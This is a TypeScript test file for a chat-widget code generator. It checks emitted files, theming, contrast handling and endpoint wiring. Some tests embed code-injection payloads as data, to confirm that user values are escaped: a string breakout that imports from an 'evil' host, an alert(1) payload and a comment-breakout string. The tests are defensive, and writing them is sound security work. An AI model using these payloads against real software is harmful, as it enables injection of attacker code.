import { mkdtempSync, readFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { accentContrastNotice, generateProject, resolveContrastForeground, writeProject } from './codegen';
import { validateConstruct, type Construct } from './schema';

function construct(overrides: Partial<Construct> = {}): Construct {
  const out = validateConstruct({
    name: 'acme-support',
    layout: 'widget',
    provider: { mode: 'mock' },
    ...overrides,
  });
  if (!out.ok) throw new Error(JSON.stringify(out.problems));
  return out.construct;
}

const file = (files: { path: string; code: string }[], path: string) => {
  const f = files.find((f) => f.path === path);
  if (!f) throw new Error(`missing ${path}; got ${files.map((x) => x.path).join(', ')}`);
  return f.code;
};

describe('generateProject (widget + mock core)', () => {
  it('emits the full project file set', () => {
    const paths = generateProject(construct()).map((f) => f.path).sort();
    expect(paths).toEqual(
      [
        'index.html',
        'package.json',
        'src/App.tsx',
        'src/element.tsx',
        'tsconfig.json',
        'vite.config.lib.ts',
        'vite.config.ts',
      ].sort(),
    );
  });

  it('is deterministic: same construct, same bytes', () => {
    expect(generateProject(construct())).toEqual(generateProject(construct()));
  });

  it('facade registers the construct name via @kitn.ai/ui/define', () => {
    const code = file(generateProject(construct()), 'src/element.tsx');
    expect(code).toContain("import { defineWebComponent } from '@kitn.ai/ui/define'");
    expect(code).toContain("defineWebComponent('acme-support'");
  });

  it('mock glue imports state + wire — never a hand-rolled SSE reader', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain("from '@kitn.ai/ui/state'");
    expect(app).toContain("from '@kitn.ai/ui/wire'");
    expect(app).not.toMatch(/text\/event-stream|EventSource|split\('\\n\\n'\)/);
  });

  it('theme accent lands on the HOST element as --kai-color-primary; mode maps onto the theme prop', () => {
    // Must be set on the host (via ctx.element in element.tsx), not anywhere
    // inside the shadow tree (App.tsx): the kit's --color-primary token is
    // resolved by a rule scoped to `:root, :host`, so --kai-color-primary set
    // on a descendant inside the shadow root never reaches it — custom
    // property inheritance only flows downward from where a property is
    // actually declared, and :host's own --color-primary is fixed at :host.
    const files = generateProject(construct({ theme: { accent: '#e91e63', mode: 'dark' } }));
    const element = file(files, 'src/element.tsx');
    expect(element).toContain("ctx.element.style.setProperty('--kai-color-primary', \"#e91e63\")");
    expect(element).toContain("theme: 'dark' as 'light' | 'dark' | 'auto'");
    // Not set anywhere inside App.tsx (the shadow-tree content) — that was
    // the bug: it looked wired but never reached the launcher or the bubble.
    expect(file(files, 'src/App.tsx')).not.toContain('--kai-color-primary');
  });

  it('a hostile accent cannot break out of the emitted string literal', () => {
    // The schema places no charset constraint on `accent` ("any CSS color"); a
    // value containing a single quote must not let attacker-controlled text
    // become live source in the emitted element.tsx (e.g. closing the literal
    // and injecting a new statement/import).
    const hostile = "red'}; import('http://evil/x.js'); const y='";
    const element = file(generateProject(construct({ theme: { accent: hostile, mode: 'system' } })), 'src/element.tsx');
    // The raw payload must never appear unescaped/unquoted in the source.
    expect(element).not.toContain(`setProperty('--kai-color-primary', '${hostile}')`);
    // It must appear only inside a properly JSON-escaped string literal — i.e.
    // the single quote in the payload is escaped, so it cannot terminate the
    // literal early.
    expect(element).toContain(`setProperty('--kai-color-primary', ${JSON.stringify(hostile)})`);
    // The raw text right after the call, unescaped, must never be followed by
    // an unescaped `'` — i.e. no bare `'red'` breakout.
    expect(element).not.toMatch(/setProperty\('--kai-color-primary', 'red'\)/);
  });

  it('uiSpec overrides the @kitn.ai/ui dependency; default is ^<kit version>', () => {
    const pkg = (spec?: string) =>
      JSON.parse(file(generateProject(construct(), spec ? { uiSpec: spec } : {}), 'package.json'));
    expect(pkg('file:../kitn-ui.tgz').dependencies['@kitn.ai/ui']).toBe('file:../kitn-ui.tgz');
    expect(pkg().dependencies['@kitn.ai/ui']).toMatch(/^\^\d+\.\d+\.\d+$/);
  });

  it('emits no unreferenced imports (the generated tsconfig sets noUnusedLocals)', () => {
    // A named import with no reference anywhere else in the file fails TS6133
    // under the emitted project's own tsconfig.json (noUnusedLocals: true).
    // Grepping for a bare, never-referenced `type { X }` import is a cheap
    // proxy for that without running tsc on the emitted string.
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).not.toContain("import type { MessagePart } from '@kitn.ai/ui/solid';");
  });

  it('emits no non-kit utility classes (interior styling rule)', () => {
    for (const f of generateProject(construct())) {
      expect(f.code).not.toMatch(/class(Name)?="(flex|grid|p-\d|m-\d|text-)/);
    }
  });

  it('composes the kit\'s MOST-INTEGRATED chat surface — ChatThread, the same composition <kai-chat> renders', () => {
    // T5 demo defect history: a hand-rolled <For>/<Message>/<MessageContent>
    // list had no padding, no gap, both roles left-aligned (round 3); Thread +
    // a hand-composed PromptInput/Button sat flush against the Dock panel and
    // clipped a focus ring (round 4 patched the symptom with inline padding).
    // Owner-ruled root cause: emitApp was re-deriving layout the kit already
    // owns. ChatThread (chat-thread.tsx) — the same composition
    // src/elements/chat.tsx renders behind <kai-chat> — owns the message
    // list AND the composer (padding, focus ring, send button) as one unit,
    // so there is nothing left here to restate.
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain("from '@kitn.ai/ui/solid'");
    expect(app).toContain('<ChatThread messages={chat.messages()}');
    expect(app).toContain('onSubmit={submit}');
    // Every hand-composed primitive from earlier rounds must be GONE, not
    // supplemented: no bare Thread, no hand-rolled message loop, no manually
    // composed PromptInput/composer chrome.
    expect(app).not.toMatch(/<For each=\{chat\.messages\(\)\}/);
    expect(app).not.toContain('<MessageContent');
    expect(app).not.toContain('<Thread ');
    expect(app).not.toContain('<PromptInput');
    expect(app).not.toContain('<Button');
  });

  it('gates undeclared-capability affordances OFF: no-capability-vocabulary construct explicitly disables webSearch, voice and attach', () => {
    // Format rule: an undeclared capability's affordance must be OFF. The v1
    // construct schema carries no capability vocabulary at all yet (lands
    // Task 9), so every construct today is "no capabilities declared" — these
    // must be explicitly false, not just omitted, so the gating decision is
    // visible in the emitted source.
    //
    // `attach` was a real kit gap as of the previous round (ChatThread had no
    // passthrough to DefaultPromptInput's disabling prop) — closed upstream
    // (ChatThreadProps now forwards `attach`, mirroring webSearch/voice), so
    // this is a real functional assertion now, not a documented-gap stand-in.
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain('webSearch={false}');
    expect(app).toContain('voice={false}');
    expect(app).toContain('attach={false}');
    // No starter prompts, no model switcher: omitted entirely (undefined has
    // the same off-by-default effect as explicit false for these two).
    expect(app).not.toMatch(/\bsuggestions=\{/);
    expect(app).not.toMatch(/\bmodels=\{/);
  });

  it('ratchet: App.tsx carries (near) zero hand-authored inline styles now that ChatThread owns layout', () => {
    // Every prior round's fix for a layout defect (composer padding,
    // send-button alignment, the accent CSS var) was ANOTHER inline style —
    // treating the symptom, not the cause. This is the ratchet the owner
    // asked for: count `style={{` occurrences in the shadow-tree content
    // (App.tsx) and fail if it creeps back up. It's currently zero because
    // ChatThread + Dock need no per-instance layout styling from us at all;
    // if a future change needs one, it should be a deliberate, reviewed
    // increase to this bound, not a silent regression back to hand-styling.
    const app = file(generateProject(construct()), 'src/App.tsx');
    const inlineStyleCount = (app.match(/style=\{\{/g) ?? []).length;
    expect(inlineStyleCount).toBe(0);
  });

  it('index.html carries a demo host-page hint for the widget layout, outside the element', () => {
    // Owner feedback: a blank white page with one small launcher confused a
    // first-time viewer of the preview. The hint is a HOST-page nicety, not
    // part of the emitted widget — it must sit outside the custom element.
    const html = file(generateProject(construct()), 'index.html');
    expect(html).toMatch(/This blank page stands in for your site/);
    expect(html).toMatch(/bottom-right corner/);
    const hintIndex = html.indexOf('This blank page stands in for your site');
    const elementIndex = html.indexOf('<acme-support>');
    expect(hintIndex).toBeGreaterThan(-1);
    expect(elementIndex).toBeGreaterThan(-1);
    expect(hintIndex).toBeLessThan(elementIndex);
  });

  it('routes the theme accent onto the HOST only — App.tsx (message content) carries no accent/primary token at all', () => {
    // Owner ruling: "accent brands CONTROLS, never content." element.tsx sets
    // --kai-color-primary once, on the host; the launcher (dock.tsx's own
    // CSS) and the composer's send button (rendered inside ChatThread's
    // DefaultPromptInput, using the kit's own Button `variant="default"`)
    // pick it up for free via ordinary custom-property inheritance — no
    // per-control code needed in App.tsx at all.
    const files = generateProject(construct({ theme: { accent: '#e91e63', mode: 'system' } }));
    const element = file(files, 'src/element.tsx');
    const app = file(files, 'src/App.tsx');
    // Exactly one hardcoded accent hex in the whole project: the
    // JSON.stringify'd custom-property value in element.tsx.
    const hexOccurrences = (element + app).match(/#e91e63/g) ?? [];
    expect(hexOccurrences).toHaveLength(1);
    expect(element).toContain("ctx.element.style.setProperty('--kai-color-primary', \"#e91e63\")");
    // App.tsx (the shadow-tree content ChatThread renders messages into)
    // authors NO styling at all any more — not a hex, not a CSS custom
    // property, not a Tailwind primary/accent utility class. If a future
    // regression routes the accent onto message content again, it will
    // necessarily show up as new text here, since today there is none.
    expect(app).not.toMatch(/#[0-9a-fA-F]{3,8}\b/);
    expect(app).not.toContain('--color-primary');
    expect(app).not.toContain('--kai-color-primary');
    expect(app).not.toMatch(/\btext-primary\b/);
    expect(app).not.toMatch(/\bbg-primary\b/);
    expect(app).not.toContain('[data-role="user"]');
    expect(app).not.toContain('[part="bubble content"]');
  });
});

describe('accent contrast (paired --kai-color-primary-foreground)', () => {
  it('resolveContrastForeground: a light accent (yellow) picks black; #e91e63 picks white', () => {
    // Worked numbers (see the doc comment on resolveContrastForeground for
    // why this is a luminance-distance comparison, not the WCAG contrast-
    // RATIO formula): yellow #ffff00 has relative luminance ≈0.928 (>0.5 —
    // closer to white, so black text sits on it); #e91e63 has relative
    // luminance ≈0.192 (<=0.5 — closer to black, so white text sits on it).
    expect(resolveContrastForeground('#ffff00')).toBe('#000000');
    expect(resolveContrastForeground('#e91e63')).toBe('#ffffff');
  });

  it('resolveContrastForeground: parses rgb()/hsl() numeric forms the same way as hex', () => {
    expect(resolveContrastForeground('rgb(255, 255, 0)')).toBe('#000000');
    expect(resolveContrastForeground('hsl(0, 76%, 52%)')).toEqual(expect.stringMatching(/^#(000000|ffffff)$/));
  });

  it('resolveContrastForeground: does not guess at named colors, var(), or other exotic syntax', () => {
    expect(resolveContrastForeground('var(--brand)')).toBeNull();
    expect(resolveContrastForeground('yellow')).toBeNull();
    expect(resolveContrastForeground('color-mix(in oklab, red, blue)')).toBeNull();
  });

  it('a parseable accent emits the base --kai-color-primary-foreground declaration before the @supports override, both at :host', () => {
    const element = file(generateProject(construct({ theme: { accent: '#e91e63', mode: 'system' } })), 'src/element.tsx');
    expect(element).toContain(':host { --kai-color-primary-foreground: #ffffff; }');
    expect(element).toContain('@supports (color: contrast-color(red))');
    expect(element).toContain('contrast-color(var(--kai-color-primary))');
    // Ordering: the base declaration comes BEFORE (outside) the @supports
    // block, so ordinary cascade order lets the native answer win where the
    // browser supports it, and lets the codegen-computed floor stand where it
    // doesn't — no !important needed either way.
    const baseIdx = element.indexOf('--kai-color-primary-foreground: #ffffff');
    const supportsIdx = element.indexOf('@supports');
    expect(baseIdx).toBeGreaterThan(-1);
    expect(supportsIdx).toBeGreaterThan(baseIdx);
  });

  it('an unparseable accent skips the base foreground declaration, still emits @supports, and leaves a softened NOTICE', () => {
    const files = generateProject(construct({ theme: { accent: 'var(--brand)', mode: 'system' } }));
    const element = file(files, 'src/element.tsx');
    expect(element).not.toContain('--kai-color-primary-foreground: #ffffff');
    expect(element).not.toContain('--kai-color-primary-foreground: #000000');
    // @supports still covers it natively where the browser can resolve
    // contrast-color() itself, accent included.
    expect(element).toContain('@supports (color: contrast-color(red))');
    expect(element).toContain('contrast-color(var(--kai-color-primary))');
    // NOTICE, softened: the theme default stands only in browsers that can't
    // do contrast-color() — not an unconditional claim.
    expect(element).toMatch(/NOTICE:.*not parseable for contrast/);
    expect(element).toMatch(/without CSS contrast-color\(\) support/);
  });

  it('accentContrastNotice: null when there is no accent or the accent parses; one line when it does not', () => {
    expect(accentContrastNotice(construct())).toBeNull();
    expect(accentContrastNotice(construct({ theme: { accent: '#e91e63', mode: 'system' } }))).toBeNull();
    const notice = accentContrastNotice(construct({ theme: { accent: 'var(--brand)', mode: 'system' } }));
    expect(notice).toMatch(/^accent 'var\(--brand\)' not parseable for contrast/);
    expect(notice).toMatch(/without CSS contrast-color\(\) support/);
  });
});

describe('endpoint provider', () => {
  const endpoint = (wire: 'openai' | 'anthropic', url = '/api/chat') =>
    construct({ provider: { mode: 'endpoint', url, wire } });

  it('openai wire: fetch to the declared URL, readOpenAIStream + toOpenAIMessages', () => {
    const app = file(generateProject(endpoint('openai')), 'src/App.tsx');
    // JSON.stringify(url) at the interpolation site (see the security test
    // below) — double-quoted, not the brief's hand-typed single-quote form.
    expect(app).toContain(`fetch(${JSON.stringify('/api/chat')}`);
    expect(app).toContain('readOpenAIStream(');
    expect(app).toContain('toOpenAIMessages(');
    expect(app).not.toContain('createMockResponder');
  });

  it('anthropic wire: the anthropic reader/encoder pair', () => {
    const app = file(generateProject(endpoint('anthropic')), 'src/App.tsx');
    expect(app).toContain('readAnthropicStream(');
    expect(app).toContain('toAnthropicMessages(');
  });

  it('no hand-rolled SSE and no key material, ever', () => {
    for (const wire of ['openai', 'anthropic'] as const) {
      const app = file(generateProject(endpoint(wire)), 'src/App.tsx');
      expect(app).not.toMatch(/text\/event-stream|EventSource|api[_-]?key|Authorization/i);
    }
  });

  it('mock stays mock: no fetch, no readOpenAIStream reader import name collision with the wire encoders', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain('createMockResponder');
    expect(app).not.toContain('toOpenAIMessages(');
    expect(app).not.toContain('toAnthropicMessages(');
  });

  it('url is JSON-stringified at the fetch call site — a quote/backtick/script payload cannot break out into new JS', () => {
    // Mirrors the accent-escaping precedent in emitElement: provider.url is an
    // UNCONSTRAINED z.string(), so it must be embedded the same safe way.
    const hostile = `'; alert(1); const x='`;
    const app = file(generateProject(endpoint('openai', hostile)), 'src/App.tsx');
    expect(app).toContain(`fetch(${JSON.stringify(hostile)}`);
    // The raw payload must never appear un-escaped as its own token boundary.
    expect(app).not.toContain(`fetch('${hostile}'`);
  });

  it('url is never embedded in a // comment — a U+2028/U+2029 line-separator payload cannot end the comment and expose executable text', () => {
    // U+2028 (LINE SEPARATOR) and U+2029 (PARAGRAPH SEPARATOR) are valid JS
    // line terminators that end a `//` comment, but are NOT touched by
    // commentSafe's \r\n strip — so hand-rolling comment-escaping for
    // untrusted text is a trap. The real fix is structural: the url is never
    // interpolated into a comment at all, only into the fetch() call via
    // JSON.stringify (a real string literal, immune to this class of bug).
    const hostile = `http://x console.log("INJECTED");//`;
    const app = file(generateProject(endpoint('openai', hostile)), 'src/App.tsx');
    const jsonLiteral = JSON.stringify(hostile);
    expect(app).toContain(`fetch(${jsonLiteral}`);
    // Strip the one legitimate occurrence (the JSON string literal on the
    // fetch() line) and confirm the payload appears nowhere else — in
    // particular not bare in a `//` comment where it could break out.
    const withoutTheOneLiteral = app.split(jsonLiteral).join('');
    expect(withoutTheOneLiteral).not.toContain('INJECTED');
    expect(withoutTheOneLiteral).not.toContain(' ');
  });

  it('endpoint branch: a throwing fetch/reader surfaces via stream.abort — no unhandled rejection, no stuck loading', () => {
    const app = file(generateProject(endpoint('openai')), 'src/App.tsx');
    expect(app).toMatch(/try\s*\{[\s\S]*fetch\(/);
    expect(app).toMatch(/catch \(err\) \{\s*stream\.abort\(/);
  });

  it('endpoint branch: a non-2xx response is thrown before parsing, not silently rendered as an empty reply', () => {
    const app = file(generateProject(endpoint('openai')), 'src/App.tsx');
    expect(app).toMatch(/if \(!response\.ok\) throw new Error/);
  });

  it('mock branch: the same throw -> stream.abort discipline applies (a malformed scripted turn must not hang loading forever either)', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toMatch(/try\s*\{[\s\S]*readOpenAIStream\(/);
    expect(app).toMatch(/catch \(err\) \{\s*stream\.abort\(/);
  });
});

describe('writeProject', () => {
  it('writes files and prunes stale ones tracked via .kai-manifest.json', () => {
    const dir = mkdtempSync(join(tmpdir(), 'kai-construct-'));
    const projectA = generateProject(construct());
    writeProject(projectA, dir);
    for (const f of projectA) {
      expect(existsSync(join(dir, f.path))).toBe(true);
    }

    const projectB = projectA.filter((f) => f.path !== 'index.html');
    writeProject(projectB, dir);

    expect(existsSync(join(dir, 'index.html'))).toBe(false);
    for (const f of projectB) {
      expect(existsSync(join(dir, f.path))).toBe(true);
    }

    const manifest = JSON.parse(readFileSync(join(dir, '.kai-manifest.json'), 'utf8')) as string[];
    expect(manifest).toEqual(projectB.map((f) => f.path).sort());
  });
});
